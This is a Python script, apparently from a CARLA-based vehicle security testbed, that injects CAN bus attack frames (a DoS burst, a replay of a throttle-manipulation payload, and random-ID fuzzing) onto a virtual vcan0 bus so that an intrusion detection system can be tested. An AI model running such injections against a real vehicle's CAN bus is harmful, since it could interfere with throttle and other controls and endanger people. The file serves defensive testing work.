"""
Windows CAN attack injector for CARLASec (run from the repo root).

Replaces the Linux gnome-terminal + cansend attacker path. Uses the repo's own
attacker.can_attack.CANAttack to inject attack frames onto vcan0, which the
Windows UDP CAN shim (win_can_shim, auto-loaded via .pth) carries to any
listening IDS / sniffer process.

Usage (from the CARLASec repo root):
    python win_can_inject.py            # DoS + throttle-replay + fuzzing
    python win_can_inject.py dos        # just the DoS burst
    python win_can_inject.py replay     # just the throttle-manipulation replay
    python win_can_inject.py fuzz       # just the fuzzing burst
"""
import sys
import time
from attacker.can_attack import CANAttack  # shim-redirected onto Windows UDP bus

CHANNEL = "vcan0"


def dos(atk, n=30):
    print("[inject] CAN DoS burst (id 0x000)", flush=True)
    for _ in range(n):
        atk.dos_attack()
        time.sleep(0.05)


def replay(atk, n=30):
    print("[inject] throttle-manipulation replay (id 0x1A0, README payload)", flush=True)
    for _ in range(n):
        atk.replay_attack(0x1A0, bytes.fromhex("5508010100000012"))
        time.sleep(0.05)


def fuzz(atk, n=30):
    print("[inject] fuzzing burst (random ids)", flush=True)
    for _ in range(n):
        atk.fuzzing_attack()
        time.sleep(0.05)


if __name__ == "__main__":
    which = sys.argv[1] if len(sys.argv) > 1 else "all"
    atk = CANAttack(CHANNEL, attack_type="can_dos", time_of_attack=(0, 5, 0, 0.1))
    time.sleep(0.5)
    if which in ("all", "dos"):
        dos(atk)
    if which in ("all", "replay"):
        replay(atk)
    if which in ("all", "fuzz"):
        fuzz(atk)
    print("[inject] done", flush=True)
    atk.bus.shutdown()
